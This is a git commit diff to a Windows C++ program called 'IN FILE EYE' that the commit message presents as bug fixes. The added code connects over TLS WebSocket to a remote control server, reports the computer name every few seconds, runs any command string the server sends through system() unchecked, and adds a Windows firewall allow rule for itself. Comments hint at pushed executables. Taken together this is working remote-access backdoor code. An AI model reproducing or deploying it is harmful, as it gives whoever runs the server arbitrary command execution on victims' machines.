c6411d3ad395e2e1fcde56aeb39596225d62d943
Your Name <you@example.com>
2025-07-12 22:21:55 +0600

    fix bugs

--- main.cpp
+++ main.cpp
@@ -46,84 +46,96 @@ void ErrorNotiffication(const char* message){
     MessageBoxA(NULL,message, "IN FILE EYE" ,MB_ICONERROR | MB_OK);
 }
 
+atomic<bool> shouldReconnect(true);
+atomic<bool> isConnected(false);
+ix::WebSocket webSocket;
+
+
+void startWebSocket(const string& BASE_URL, const string& pc_name) {
+    webSocket.setUrl(BASE_URL);
+    
+    ix::SocketTLSOptions tlsOptions;
+    tlsOptions.tls = true;
+    webSocket.setTLSOptions(tlsOptions);
+
+    webSocket.setOnMessageCallback([&](const ix::WebSocketMessagePtr& msg) {
+        if (msg->type == ix::WebSocketMessageType::Open) {
+            isConnected = true;
+            cout << "[+] Connected to server\n";
+        }
+        else if (msg->type == ix::WebSocketMessageType::Close) {
+            isConnected = false;
+            shouldReconnect = true;
+            cout << "[-] Disconnected from server\n";
+        }
+        else if (msg->type == ix::WebSocketMessageType::Error) {
+            isConnected = false;
+            shouldReconnect = true;
+            cout << "[!] WebSocket error: " << msg->errorInfo.reason << endl;
+        }
+        else if (msg->type == ix::WebSocketMessageType::Message) {
+            try {
+                json data = json::parse(msg->str);
+                string type = data["type"];
+
+                if (type == "command") {
+                    string text = data["text"];
+                    system(text.c_str());
+                }
+                else if (type == "file") {
+                    string filename = data["filename"];
+                    // handle file download/save
+                }
+            }
+            catch (exception& e) {
+                cout << "[!] JSON parse error: " << e.what() << endl;
+            }
+        }
+    });
+
+    webSocket.start();
+
+    // Отправляем имя ПК после подключения
+    thread([pc_name]() {
+        json send_data;
+        send_data["name"] = pc_name;
+
+        while (true) {
+            if (isConnected) {
+                webSocket.send(send_data.dump());
+                this_thread::sleep_for(std::chrono::seconds(5));
+            } else {
+                this_thread::sleep_for(std::chrono::seconds(1));
+            }
+        }
+    }).detach();
+}
 
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
 // int main()
 {
-    string command_netsh = "netsh advfirewall firewall add rule name=\"Eye rule\" dir=in action=allow program=\"" + getExePath() +  "\" enable=yes profile=public";
-    system(command_netsh.c_str());
-    
-    
+    ix::initNetSystem();
+
+    string pc_name = getComputerName();
     string BASE_URL = "wss://pccontrolbackend.onrender.com/openC";
 
-    
-    cout << BASE_URL << endl;
-    ix::initNetSystem();
-    ix::WebSocket webSocket;
-    
-    ix::SocketTLSOptions tlsOptions;
-    tlsOptions.tls = true;
+    // Настройка брандмауэра
+    string command_netsh = "netsh advfirewall firewall add rule name=\"Eye rule\" dir=in action=allow program=\"" + getExePath() + "\" enable=yes profile=public";
+    system(command_netsh.c_str());
 
-    webSocket.setTLSOptions(tlsOptions);
-
-    webSocket.setUrl(BASE_URL); 
-    
-    bool isConnect = false;
-    
-    webSocket.setOnMessageCallback([&](const ix::WebSocketMessagePtr& msg) {
-         if (msg->type == ix::WebSocketMessageType::Close) {
-            isConnect = false;
-            
-        } else if(msg->type == ix::WebSocketMessageType::Message){
-            if(!isConnect){
-                isConnect = true;
-            }else{
-              try{  
-                json data = json::parse(msg->str);
-
-                string type = data["type"];
-                if(type == "command"){
-                    string text = data["text"];
-                    system(text.c_str());
-// "type": "file"
-// "text": "start https://..."
-                    }
-                if(type == "file"){
-                    string filename = data["filename"];
-// "type": "file"
-// "filename": "".exe
-// "data": 0010101010100101010
-                }
-            } catch(exception& e){
-                // cout << e.what() << endl;
-            }
-         
-            }
+    // Цикл автоматического переподключения
+    while (true) {
+        if (shouldReconnect) {
+            webSocket.stop();  // На всякий случай
+            cout << "[*] Trying to reconnect...\n";
+            startWebSocket(BASE_URL, pc_name);
+            shouldReconnect = false;
         }
-    });
-    
-    webSocket.start();
-    
-    string pc_name = getComputerName();
 
-    json send_data;
-    send_data["name"] = pc_name;
-    
-
-    while(true){
-        if(isConnect){
-        //   cout << '.';
-        }else{
-          webSocket.send(send_data.dump());  
-        //   cout << send_data["key"] << endl;
-        //   cout << send_data["name"] << endl;
-        }
-        this_thread::sleep_for(std::chrono::seconds(1));
+        this_thread::sleep_for(std::chrono::seconds(5));
     }
-    
-    
-    webSocket.stop();
+
     ix::uninitNetSystem();
     return 0;
 }
